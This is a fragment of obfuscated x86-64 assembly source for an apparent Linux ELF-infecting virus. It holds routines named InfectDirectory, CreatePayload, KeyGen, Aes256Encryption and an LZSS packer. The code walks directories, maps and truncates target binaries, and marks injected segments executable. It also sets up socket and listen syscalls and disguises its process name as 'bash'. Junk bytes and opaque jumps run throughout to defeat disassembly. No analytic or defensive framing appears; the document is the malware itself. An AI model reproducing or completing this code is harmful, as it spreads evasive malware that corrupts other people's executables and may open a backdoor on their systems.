    jmp         ..@7OYEDtRd8u84
..@mmyU48eG9eys:
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+5
db 0x1b, 0x3c, 0xbc
    jmp         ..@jFhi3kJLvhO9
..@qWjr5YVYFDfO:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    js          ..@AAswunVkE3DA
    jns         ..@AAswunVkE3DA
..@X4R4p6ICWnWA:
    xor         r2, r2
    jl          ..@91Ld5crl16Aj
    jge         ..@91Ld5crl16Aj
..@OyLkhrvjqayG:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    je          ..@rqmRThBNF6S8
    jne         ..@rqmRThBNF6S8
..@Jg0SraqkQ0Mw:
%ifdef X86_32
    xor         ebx, ebx
    mov         ecx, DWORD [edi+file.filesize]
%endif
    jmp         ..@1ZF7Xp8nq9Id
..@6VV7qe0Gl57h:
    mov         rdi, QWORD [r5+file.fileptr]
    mov         eax, 0x0
    jl          ..@Y80XuG71Ex34
    jge         ..@Y80XuG71Ex34
..@GlF692QjyMy1:
    add         rsi, WINDOW_LENGTH
    jmp         ..@jcFMFuu790QI
..@PqONVt1SwScP:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jge         ..@E30ij6Jqzn3b
    jmp         $+4
db 0xe9, 0x26
    jb          ..@hnQRI9eiy03T
    jae         ..@hnQRI9eiy03T
..@OZfcLqTmISNu:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+4
db 0x1c, 0x92
    jmp         ..@txcKA7rWgW9z
..@yK2hTSJLsKaY:
    jmp         ..@DxQERwECEJL1
    jmp         $+4
db 0x6c, 0x97
    je          ..@06dX8GSywGIS
    jne         ..@06dX8GSywGIS
..@3SdeJUhcf3l7:
    mov         rax, 1
    jb          ..@zRY1nY8LyCph
    jae         ..@zRY1nY8LyCph
..@KG3TZN0a15V8:
    pop         r1
    jmp         $+4
db 0xfe, 0xa6
    jmp         $+3
db 0x4b
    jmp         ..@d3jCniuos3Xw
..@7apqH8j1k2p6:
    xor         rax, rax
    jmp         $+3
db 0xc9
    jmp         $+5
db 0x4a, 0xb2, 0x46
    jb          ..@5nJsjTWyWKnv
    jae         ..@5nJsjTWyWKnv
..@1uIRkZ2Im4xd:
    mov         QWORD m5, 0x01
    push        0x00
    mov         rax, SYS_GETUID
    jmp         $+4
db 0xa0, 0x28
    jmp         ..@vaZjf6MBszEo
..@s4Mr12yz0bym:
    movdqu      xmm1, oWORD [rsp+0xe0]
    jl          ..@cKm36vz1puIO
    jge         ..@cKm36vz1puIO
..@P6yGRDSuJ0pU:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    jl          ..@DGTTzc0sw22x
    jge         ..@DGTTzc0sw22x
..@070bFtgjJ81m:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jne         ..@JTu2szBC5ZjF
    jmp         $+4
db 0x44, 0xcd
    je          ..@bxEafB5VTwKQ
    jne         ..@bxEafB5VTwKQ
..@vIygoZ9EQEYP:
    and         r2, 0x00ffffff
    jmp         $+3
db 0x90
    jmp         $+3
db 0xa7
    jmp         ..@iK2kkl0Ffrx7
..@LLLE1hLPNKSS:
    jmp         ..@DemRlB7BiDZD
    jmp         $+4
db 0x1d, 0x9d
    jmp         $+3
db 0x13
    jmp         ..@4KJW7e21bp4E
..@cAPtdXvuH5By:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_LISTEN
%endif
    jmp         $+4
db 0xd5, 0x0e
    jl          ..@BBHxvqw3bYm3
    jge         ..@BBHxvqw3bYm3
..@31tcHa97HZry:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x30]
    js          ..@2Ypbj485B4b6
    jns         ..@2Ypbj485B4b6
..@GMcmu2wDUtO9:
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         $+3
db 0xe0
    jmp         $+4
db 0x59, 0xcf
    jb          ..@NWmwdLkIxukr
    jae         ..@NWmwdLkIxukr
..@Q8mwg8XPhc55:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    je          ..@YDyEab90jvwN
    jne         ..@YDyEab90jvwN
..@Y4zeeDQ8hToa:
    test        r2, r2
    jmp         $+5
db 0xc4, 0xeb, 0x82
    js          ..@an63l28oDN9m
    jns         ..@an63l28oDN9m
..@9K0q3jp4AiVA:
    rep movsb 
    jmp         $+5
db 0xb3, 0x51, 0x3c
    jl          ..@hbV4aDAkY8YZ
    jge         ..@hbV4aDAkY8YZ
..@ZUlx5TqkdHih:
    cmp         rax, 0x02
    je          ..@SmA33rkVl8GG
    jmp         ..@UuQmXridA4IA
..@Or1n13pJQ3Sm:
    call_vsp    GetEnv
    jmp         ..@UMHMH36GFnB9
..@RESVyoYdVpSi:
    ret
    jmp         $+3
db 0xca
    jb          IsNum
    jae         IsNum
..@jFQ2eETgd7v4:
    xor         rax, rax
    xor         rdx, rdx
    jmp         $+4
db 0x5d, 0xf9
    jmp         $+4
db 0x15, 0xd8
    jb          ..@pItrwSPfhngM
    jae         ..@pItrwSPfhngM
..@YDyEab90jvwN:
    cmp         rax, 0x00
    jle         ..@uVJFiUsRVaHF
    jmp         $+3
db 0x73
    js          ..@4Tlj3qo4fRB5
    jns         ..@4Tlj3qo4fRB5
..@QLmR5oGuva8g:
    sub         rsp, _PROC_OFF_size
    js          ..@Pliq9JOmPRtz
    jns         ..@Pliq9JOmPRtz
..@r9WFeDtVwt7N:
    mov         rdi, m7
    mov         ecx, PADDING
    mov         eax, 0x00
    jmp         ..@0Ib9AbWh8qfN
..@zoekxl7gmNdp:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+5
db 0x00, 0xdd, 0x5e
    js          ..@lX6NkIqmPNM4
    jns         ..@lX6NkIqmPNM4
Aes256Encryption:
    jmp         ..@AeEvs6bYX0F6
..@mxx6jmksVMAk:
%ifdef X86_64
    mov         eax, SYS_MMAP
    syscall
%endif
    jmp         $+4
db 0xc3, 0x55
    jmp         $+5
db 0xda, 0xfd, 0xa8
    jb          ..@3hfmlIhg3IT1
    jae         ..@3hfmlIhg3IT1
..@gbMQRJt665VJ:
    ret
    jmp         IsELFComplete
..@Gbo8MEVQbtJl:
    je          ..@PCD4avutFVRp
    mov         r3, r4
    jmp         $+5
db 0x2c, 0x2e, 0x52
    jl          ..@QArSp0hxp2O3
    jge         ..@QArSp0hxp2O3
..@LnQ0NFIfboes:
    add         rsp, _NBF_OFF_size
    jmp         ..@EboC1gGLRgJo
..@6DdhiHy1mt0i:
    add         r2, r1
    jb          ..@9ZzTNmaeHrmd
    jae         ..@9ZzTNmaeHrmd
..@Bhyes3auG0Ga:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         $+4
db 0xbd, 0x2d
    jmp         $+5
db 0xf4, 0x36, 0x58
    jmp         ..@CCFQAICuD6Ri
..@hbV4aDAkY8YZ:
    pop         r5
    pop         r4
    jmp         $+4
db 0xcf, 0x2c
    jl          ..@BJKiSf1AEWCp
    jge         ..@BJKiSf1AEWCp
..@GVnjjJMGUJU4:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    jmp         $+4
db 0x51, 0x44
    jmp         ..@ud4cXyzbPkIS
..@NBY2XjpLQxEN:
    pop         r3
    pop         r2
    pop         r1
    jmp         $+4
db 0x50, 0x82
    je          ..@gbMQRJt665VJ
    jne         ..@gbMQRJt665VJ
..@MZ875haJfsue:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+3
db 0xf5
    js          ..@7dVW2qbHndQo
    jns         ..@7dVW2qbHndQo
..@b9sZ5B0HUiLs:
%ifndef ENABLE_DEBUGGING
    call_vsp    ExitProgram
%endif
    jb          ..@JKdIV4a05Lik
    jae         ..@JKdIV4a05Lik
..@jrnrldkflTPE:
    add         rdi, non_packed_len
    mov         m7, rdi
    jmp         $+4
db 0x72, 0xbb
    jb          ..@HzHxmRlKN5Nk
    jae         ..@HzHxmRlKN5Nk
..@VutkUu08BucA:
    mov         r2d, DWORD [r1]
    jmp         $+4
db 0xec, 0xce
    jl          ..@vIygoZ9EQEYP
    jge         ..@vIygoZ9EQEYP
..@sSnzkfA8oLxs:
    jne         ..@06dX8GSywGIS
    xor         rcx, rcx
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         ..@DxQERwECEJL1
..@F3XN44zpB7Ns:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         $+5
db 0x79, 0x6f, 0xfe
    jb          ..@NFXGikrKRvy1
    jae         ..@NFXGikrKRvy1
..@arQ5TSnb1bRI:
    shl         edi, 0x8
    mov         ax, dx
    and         ax, 1111b
    jmp         $+3
db 0x06
    jmp         ..@JaapuLiSC9Xg
..@rZnRRBiXT0zg:
    cmp         BYTE [r1], 0x00
    je          ..@73Ytbkw6lXmF
    jmp         $+4
db 0x67, 0x95
    jmp         $+4
db 0x9c, 0x4d
    je          ..@ngtmI1qYAT02
    jne         ..@ngtmI1qYAT02
..@8p4V9OZRVYOu:
%ifndef ENABLE_DEBUGGING
    mov         r2d, 0x1
%endif
    js          ..@GwomMtTbHCyV
    jns         ..@GwomMtTbHCyV
..@KNVzH7zGDRoH:
    mov         r1, QWORD [r5+file.fileptr]
    add         r1, signature_len-1
    js          ..@Snx0Px8i0Qu5
    jns         ..@Snx0Px8i0Qu5
..@ahfTYeSYykua:
    call_vsp    ExitProgram
    jl          ..@QtPPrQ7ZMsxf
    jge         ..@QtPPrQ7ZMsxf
..@zWmXX9KO2gbZ:
    jmp         ..@JTu2szBC5ZjF
    js          ..@jFQ2eETgd7v4
    jns         ..@jFQ2eETgd7v4
..@2DSNLCwfDy5o:
    sub         rsp, _INFDIR_OFF_size
    jmp         ..@mxuWUL6Q02lU
..@3If9S5OFN7F4:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    call        WORDToDWORDASCII
    jmp         $+3
db 0xa9
    jmp         $+4
db 0x57, 0xd4
    jmp         $+4
db 0xaa, 0xa3
    jmp         $+5
db 0x0f, 0x11, 0xcd
    jmp         ..@dUSx78xm8kPf
..@OnckgynueIle:
%ifndef ENABLE_DEBUGGING
    xor         r5, r5
%endif
    jmp         $+3
db 0x0e
    jmp         $+4
db 0xf9, 0x5f
    jl          ..@Zor9ErL08qKD
    jge         ..@Zor9ErL08qKD
..@7KHSEpiFze86:
    mov         r1, r5
    jb          ..@rZnRRBiXT0zg
    jae         ..@rZnRRBiXT0zg
..@WuTRGghTLcCh:
    sub         rsp, _UPDATASIG_OFF_size
    jmp         $+4
db 0xc0, 0xf3
    jmp         ..@qCNOfiZFXJGS
..@twNCC90vW1GM:
    syscall
    test        al, al
    jmp         $+4
db 0xe3, 0xb2
    js          ..@DVZng0lUFXBo
    jns         ..@DVZng0lUFXBo
..@wavOFKXd2hLq:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         ..@h6YPD507PBBQ
KeyGen:
    jmp         ..@e8AJyJaj9oGV
..@JWx1wHZJMqn6:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+4
db 0x8a, 0x49
    jmp         $+5
db 0x88, 0xeb, 0xc6
    jl          ..@JXJ7MHej4bkN
    jge         ..@JXJ7MHej4bkN
..@3tgr1dgF4KLD:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    js          ..@idYpoNSWDRee
    jns         ..@idYpoNSWDRee
..@Kamc29WqrilE:
    test        al, al
    jmp         $+4
db 0xfb, 0x6c
    jmp         ..@EmtUVW2PRcjc
..@VEIJOp0u38dQ:
    jmp         ..@I9CJGnk2o3kR
    je          ..@m1LhfoYx7z6X
    jne         ..@m1LhfoYx7z6X
..@DPmRyQvwDTLI:
    xor         rdx, rdx
    jmp         ..@VidACYbdlPPW
..@t8J7EBFVGfAw:
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    jmp         $+3
db 0x32
    js          ..@Y6o5GXTWsNHE
    jns         ..@Y6o5GXTWsNHE
..@PU7OZI7LBBcO:
    cmp         eax, 0x0
    jle         ..@G2vj5Dap1mbM
    jmp         $+5
db 0xf7, 0x9f, 0xa4
    jmp         ..@srBeW1FJ8yc1
..@tLKzoiDXBZ3g:
    pop         r5
    jb          ..@r7jBTaQMtkMh
    jae         ..@r7jBTaQMtkMh
..@E30ij6Jqzn3b:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         $+5
db 0x58, 0xa1, 0x12
    jmp         ..@mmyU48eG9eys
..@l3n1KNaAG7sS:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    rep         movsb
    jmp         ..@WpPtAueU5ari
..@DCpQ3HjDsnQM:
    lea         r1, [rsp+_INFFILE_OFF.file]
    mov         r2, r4
    call        AddSizeMappedFile
    jl          ..@8oLSGPBTb0sc
    jge         ..@8oLSGPBTb0sc
..@QnYDgrbvB0r7:
    ret
    jmp         $+5
db 0xdf, 0x24, 0x88
    jmp         LzssEncoder
..@C3sS2KZY5SYL:
    add         r1, 1
    jmp         $+5
db 0x08, 0xc3, 0x3b
    jmp         ..@BA4jG9UCAL8x
..@UuQmXridA4IA:
    cmp         rax, 0x01
    je          ..@yuZfsxnj9hDG
    jmp         $+5
db 0x1f, 0x08, 0x04
    jl          ..@mHrQUtF1N0yS
    jge         ..@mHrQUtF1N0yS
CreatePayload:
    jmp         ..@LhD1yg5AItNH
..@8HvfYB54Zfqr:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+4
db 0x39, 0x43
    jl          ..@jldfAqrCjUZF
    jge         ..@jldfAqrCjUZF
..@yAv8gR7DW5rA:
    call        IsELFComplete
    jmp         ..@IHJxj5XHqdKb
..@XBXDjTWRQIbK:
    add         rsi, rdx
    jmp         $+3
db 0x85
    jl          ..@MAd8nxN6g5Bk
    jge         ..@MAd8nxN6g5Bk
..@jTXiqgRzpLip:
    call        Strcpy
    jb          ..@EbU4d1fXc3VC
    jae         ..@EbU4d1fXc3VC
..@jldfAqrCjUZF:
    xor         rcx, rcx
    mov         ecx, signature_len
    rep         movsb
    jmp         $+3
db 0x1b
    jmp         ..@KdaL0I18Ywl6
..@vHg3ugrVj9Pc:
    jnz         ..@ZlzoWbGZ1rCK
    js          ..@uS0EiiY7Y1dx
    jns         ..@uS0EiiY7Y1dx
..@oEmjbaNAKCDp:
    mov         rax, SYS_FTRUNCATE
    jmp         $+3
db 0x4c
    jl          ..@twNCC90vW1GM
    jge         ..@twNCC90vW1GM
..@pRczSHbQswgV:
    jmp         ..@sUnkOTFkyvOA
    js          ..@OUigEOCdc93v
    jns         ..@OUigEOCdc93v
..@dhjHERDeckKx:
%ifndef ENABLE_DEBUGGING
    mov         r2, rsp
    mov         r3d, 0x10
%endif
    jmp         $+3
db 0x01
    jl          ..@DWVEWRISHSA3
    jge         ..@DWVEWRISHSA3
..@Z4fZAkCJg4yv:
    push        r1
    sub         rsp, _VADDR_OFF_size
    je          ..@Rgb6nLXNPDuX
    jne         ..@Rgb6nLXNPDuX
..@cX5W7DCWysL5:
    mov         r1, r5
    jmp         ..@Bhra8iXkVTNu
..@C3v33JlnEity:
    je          ..@fuRJBf43PV1x
    xor         r3, r3
    jmp         ..@Sdqxxzh0gMmQ
..@GyIb0FlrQPN7:
    xor         rdi, rdi
    js          ..@Gw2B3XDlAdKI
    jns         ..@Gw2B3XDlAdKI
..@rtJ8tXg4jvUr:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jb          ..@DemRlB7BiDZD
    jae         ..@DemRlB7BiDZD
..@X43uhLpXepHb:
    shl         edx, POSITION_BITS+LENGTH_BITS
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    shl         ebx, LENGTH_BITS
    jmp         $+4
db 0x19, 0xf4
    jmp         ..@36j4ciHC9CNo
..@7OYEDtRd8u84:
    xor         rax, rax
    jb          ..@ggh9V8r5j8ks
    jae         ..@ggh9V8r5j8ks
..@8LmO9IgBBK2A:
    jnz         ..@1fxdJjHfhaQM
    je          ..@viQz0lCjMiYA
    jne         ..@viQz0lCjMiYA
..@rgP6PG4rtspo:
    mov         r3, non_packed_len
    js          ..@rWoWrYwRy25g
    jns         ..@rWoWrYwRy25g
..@F6AUdMJLgoZ6:
    mov         r2, QWORD [r1+file.filename]
    mov         r4, r5
    jmp         $+4
db 0x12, 0xcd
    jl          ..@tMNHkbkHyGrC
    jge         ..@tMNHkbkHyGrC
..@LNTic7RaS6V9:
    add         rsp, _LZSSE_OFF_size
    ret
    jmp         $+3
db 0x3b
    jmp         $+4
db 0xb8, 0x33
    jl          UpdateSignature
    jge         UpdateSignature
..@sbMHJcjqhE3B:
    add         r1, rax
    sub         r1, 1
    jmp         $+4
db 0x77, 0x0e
    jmp         $+4
db 0x2f, 0xf8
    jmp         $+4
db 0xc2, 0xc9
    js          ..@vHv4KPxeD6SI
    jns         ..@vHv4KPxeD6SI
..@14XK4MmFaGjZ:
    movdqu      xmm1, oWORD [rsp]
    pxor        xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x10]
    jmp         $+3
db 0x5f
    jb          ..@qhQmjShrbDHZ
    jae         ..@qhQmjShrbDHZ
..@CzbFcT5lSEtf:
    pop         r2
    jmp         ..@CgPtTv5ofqBI
..@5MaP7RdoJQf2:
    mov         rdi, m6
    add         rdi, virus_len-_start
    mov         rsi, m7
    jmp         ..@2Pgnr5z62E1n
..@ri7BCpvZYX6a:
    xor         rax, rax
    xor         rcx, rcx
    jmp         $+5
db 0x08, 0xee, 0x96
    jmp         $+3
db 0x4c
    jmp         $+4
db 0xc5, 0xc6
    jmp         ..@LxD3D7w65qOZ
..@LxD3D7w65qOZ:
    mov         rdi, m6
    mov         rcx, m7
    jmp         $+5
db 0x34, 0x86, 0x7b
    jl          ..@kbdyNMaF4iOE
    jge         ..@kbdyNMaF4iOE
..@QkAiq2lki8Xa:
    cmp         r3, 0x00
    jmp         $+4
db 0x0a, 0x58
    jmp         $+4
db 0xc4, 0x10
    js          ..@uLD53QGWgJFh
    jns         ..@uLD53QGWgJFh
..@OzuHjy46OlyS:
    jne         ..@vyXP1MaJbrGK
    je          ..@NHTkFjfYjTFx
    jne         ..@NHTkFjfYjTFx
..@TS1aeONJ7fK8:
    and         eax, edx
    test        eax, eax
    jmp         $+4
db 0xef, 0x82
    jl          ..@HmjyFAK4TDXW
    jge         ..@HmjyFAK4TDXW
..@oBOEdl1pvEZw:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@v4z0Ea0OrKT8
..@MZ6zaa9LzUOQ:
    xor         r2, r2
    jmp         ..@sUZm4RULi9QI
..@idYpoNSWDRee:
    test        al, al
    jmp         ..@8LmO9IgBBK2A
..@07UY41zgZb2A:
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    jmp         $+3
db 0x82
    jmp         ..@L4HC5vuNecrK
..@QArSp0hxp2O3:
    mov         r2, m6
    jmp         $+3
db 0x4c
    jb          ..@PXU1WMbmvPsG
    jae         ..@PXU1WMbmvPsG
..@GwomMtTbHCyV:
%ifndef ENABLE_DEBUGGING
    mov         r3d, 0x6
    mov         eax, SYS_SOCKET
%endif
    jmp         $+4
db 0x6b, 0xcb
    je          ..@DXpQ2xt9myew
    jne         ..@DXpQ2xt9myew
..@FKPyyBeoD0fE:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jl          ..@0bC0CAknVWoZ
    jge         ..@0bC0CAknVWoZ
..@GNunL9rMS4eW:
    mov         rsi, rsp
    jmp         ..@t8J7EBFVGfAw
..@arBdRvtiUFQg:
    jge         ..@jFQ2eETgd7v4
    jmp         $+3
db 0x6b
    jmp         $+5
db 0x88, 0x4a, 0xdc
    jl          ..@n6DQWwDDK3mh
    jge         ..@n6DQWwDDK3mh
..@Qgz56krrUpLW:
    add         r4, rax
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jmp         $+5
db 0x77, 0x6e, 0xcd
    jmp         $+5
db 0x8f, 0x83, 0x19
    jb          ..@vzm3djvMya41
    jae         ..@vzm3djvMya41
..@EbU4d1fXc3VC:
    mov         BYTE [r1], '/'
    jmp         $+5
db 0xd8, 0x24, 0xb2
    js          ..@lPK4RQ6Btbri
    jns         ..@lPK4RQ6Btbri
..@MW10r1vY8mE4:
    mov         r2, 1
    call        InfectDirectory
    jmp         $+5
db 0x62, 0x3a, 0x61
    jb          ..@V0ftHA7ce6cV
    jae         ..@V0ftHA7ce6cV
..@ggh9V8r5j8ks:
    cmp         BYTE [r1], 0x0
    jmp         $+5
db 0x78, 0x8f, 0x85
    jmp         ..@gzgmrooWVWfy
..@x1swpZrxv6p9:
    movzx       rax, BYTE [r2]
    mov         [r1], rax
    jmp         $+3
db 0xa6
    jl          ..@C3sS2KZY5SYL
    jge         ..@C3sS2KZY5SYL
..@aRvCfUMWPMLQ:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    sub         al, 0x02
    mov         edx, 1
    jmp         $+4
db 0x22, 0x42
    jmp         $+3
db 0x7c
    js          ..@X43uhLpXepHb
    jns         ..@X43uhLpXepHb
..@YviMrODLMqEe:
    call_vsp    ExitProgram
    jmp         ..@0MGfSq8YL8ka
..@an63l28oDN9m:
    jnz         ..@WJF4uIIQSfK0
    mov         r1, r5
    jl          ..@yAv8gR7DW5rA
    jge         ..@yAv8gR7DW5rA
..@tQet3rk47QBZ:
    mov         DWORD [rdi], eax
    jb          ..@VZoqe2uHWKCb
    jae         ..@VZoqe2uHWKCb
..@ZZK0EEGOtQKp:
    rep         movsd
    xor         rax, rax
    xor         rcx, rcx
    jmp         $+5
db 0x20, 0xbb, 0x5e
    jmp         $+5
db 0xeb, 0xf1, 0x65
    jmp         $+5
db 0x4e, 0x6e, 0x5c
    jb          ..@r9WFeDtVwt7N
    jae         ..@r9WFeDtVwt7N
..@iqQ9VFzHu8ux:
%ifndef ENABLE_DEBUGGING
    jge         ..@BBVxW8mHgrdO
    xor         rax, rax
    xor         r2, r2
%endif
    jmp         ..@MNCiMLZSGgAy
..@JV8BweOsVeyT:
    jge         ..@OQhs4eL3MzGv
    je          ..@zkgDZMluPH2X
    jne         ..@zkgDZMluPH2X
..@Ez5Kn8Fcs7Dd:
    jmp         ..@PCD4avutFVRp
    je          ..@Mqn6xwOOgQjq
    jne         ..@Mqn6xwOOgQjq
..@OZoF9Sqt7h2w:
    mov         BYTE [r1], '/'
    jmp         $+4
db 0x85, 0x0e
    js          ..@FFuXYddqDEH9
    jns         ..@FFuXYddqDEH9
..@5W3ri3udIcF7:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    js          ..@DazUWC7bg8QO
    jns         ..@DazUWC7bg8QO
..@huNadhI3FUbM:
    push        r1
    mov         r5, r1
    jmp         $+5
db 0xb7, 0xd2, 0x36
    jmp         $+4
db 0xf8, 0x0e
    jmp         ..@ksx4VjbVoZCI
..@OMZ1jCyAYlsd:
    push        r4
    push        r5
    jmp         ..@4eZFVVaFbUAt
AddSizeMappedFile:
    jmp         ..@OMZ1jCyAYlsd
..@s3m9eQXHVftv:
    sub         rcx, rax
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         ..@jU3PJYK0uKsH
..@mkJ5HWodLpON:
    add         rax, 4
    jmp         ..@rCeHF41hRG3i
..@jcFMFuu790QI:
    rep         movsb
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    jmp         $+4
db 0x92, 0xc3
    jb          ..@mOBWMYPcJdgQ
    jae         ..@mOBWMYPcJdgQ
..@CWq5y0ME7YYN:
    or          edi, eax
    jb          ..@LGO8J8XAMu6a
    jae         ..@LGO8J8XAMu6a
..@BBHxvqw3bYm3:
%ifndef ENABLE_DEBUGGING
    syscall
    xor         rax, rax
    xor         r4, r4
%endif
    js          ..@TTjtecoGmB7N
    jns         ..@TTjtecoGmB7N
..@R10u59LJLKQf:
    call_vsp    Strncmp
    test        ax, ax
    jb          ..@CL1Bijx4jPDI
    jae         ..@CL1Bijx4jPDI
..@BA4jG9UCAL8x:
    add         r2, 1
    jmp         Strcpy
    jmp         $+5
db 0x51, 0x07, 0xbd
    js          ..@uzvn5kwGomio
    jns         ..@uzvn5kwGomio
WORDToDWORDASCII:
    jmp         ..@kcIqO5zCpwCe
..@aY9ynhNTzNBj:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0xad, 0xc8
    jl          ..@ubN0ckvAJ484
    jge         ..@ubN0ckvAJ484
..@vHv4KPxeD6SI:
    cmp         BYTE [r1], DT_DIR
    jne         ..@UmSSUK2tBSI3
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x51, 0xd7, 0x4e
    jmp         $+4
db 0x9b, 0x60
    jmp         ..@jKJyCvj4U4Jn
..@kK5BmElxBazS:
    add         rdi, rax
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         $+5
db 0x52, 0xb3, 0x4d
    jmp         $+5
db 0x88, 0x46, 0x27
    jmp         $+5
db 0x10, 0xab, 0x38
    js          ..@sSnzkfA8oLxs
    jns         ..@sSnzkfA8oLxs
..@xHicp6zGP2UE:
    jnz         ..@ejI33cUbgVTO
    jmp         ..@6xuyB0I4JyFe
..@JAOBUwiT2L08:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jl          ..@aS6WiMwKHmbS
    jge         ..@aS6WiMwKHmbS
..@KfCbng6CNFel:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@0LfujBbczptF
..@9AVCfmRKUCLg:
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    add         r1, 2
    mov         ax, WORD [r1]
    jmp         $+5
db 0x90, 0x35, 0x5d
    jmp         ..@yKiiobSIQrpu
..@L4HC5vuNecrK:
    call        UpdateSignature
    jmp         $+3
db 0x54
    jmp         ..@KNVzH7zGDRoH
..@lX6NkIqmPNM4:
%ifndef ENABLE_DEBUGGING
    cmp         rax, 0x0
%endif
    jmp         ..@f0APO7nLtR3r
..@HHh6cNtryLtb:
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0xd7, 0x2d
    je          ..@MZ6zaa9LzUOQ
    jne         ..@MZ6zaa9LzUOQ
..@emwcRm4r6qJB:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jmp         ..@cX5W7DCWysL5
..@E2Rjd89HqrHi:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jl          ..@PwHJtqF5teoU
    jge         ..@PwHJtqF5teoU
..@GgVrzH3DcR0C:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    mov         r2, r5
    mov         rax, SYS_PRCTL
%endif
    jl          ..@oJVL5Lukf3hx
    jge         ..@oJVL5Lukf3hx
..@FpLBijL0K6t4:
    ret
    jmp         $+4
db 0x51, 0x22
    js          MemMove
    jns         MemMove
..@DhxjLD2gaVNB:
    push        r4
    jmp         $+3
db 0x41
    jl          ..@aol0vEACItR9
    jge         ..@aol0vEACItR9
..@Ad4FUIy3sqBv:
    mov         QWORD [r2+p_h.p_memsz], r4
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    jmp         $+5
db 0xc9, 0x06, 0x18
    jl          ..@vSt7HQd4KT5l
    jge         ..@vSt7HQd4KT5l
..@I7ywPkawWP5i:
%ifndef ENABLE_DEBUGGING
    mov         r1d, 0x2
%endif
    jb          ..@8p4V9OZRVYOu
    jae         ..@8p4V9OZRVYOu
..@Zmp5VhiZLGoo:
    mov         rax, [r5+file.filesize]
    jmp         $+5
db 0xec, 0x7d, 0x81
    jmp         $+5
db 0xf3, 0x95, 0x48
    jmp         $+4
db 0xd8, 0xa8
    jmp         ..@lN3NpBEFaDR0
..@gmiTegOBaTF8:
    je          ..@wQDsr1hFEvJo
    jmp         $+4
db 0x88, 0xca
    jmp         ..@v6ZbLzMJEWw6
..@VQcoJ3xoyPDE:
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    GGLOBAL     _signature.start
    jmp         $+3
db 0xa3
    jb          ..@3vfPXq4L2Pkg
    jae         ..@3vfPXq4L2Pkg
..@5ejll91GRBj6:
    cmp         BYTE [r5], DT_REG
    jl          ..@DG4XsFvvrcgd
    jge         ..@DG4XsFvvrcgd
..@Rk2NAudoGH1S:
    inc         WORD m5
    jl          ..@Ez5Kn8Fcs7Dd
    jge         ..@Ez5Kn8Fcs7Dd
..@aByPF9fFEbgV:
    xor         rax, rax
    jmp         $+4
db 0x16, 0x7d
    jl          ..@ymYQ71NNhVxQ
    jge         ..@ymYQ71NNhVxQ
..@h2ndWB2zzdCt:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.key_preview-_signature.start+4
    mov         DWORD [rdi], eax
    jmp         $+4
db 0x84, 0x3f
    js          ..@3If9S5OFN7F4
    jns         ..@3If9S5OFN7F4
..@EACm3jX54Aa0:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
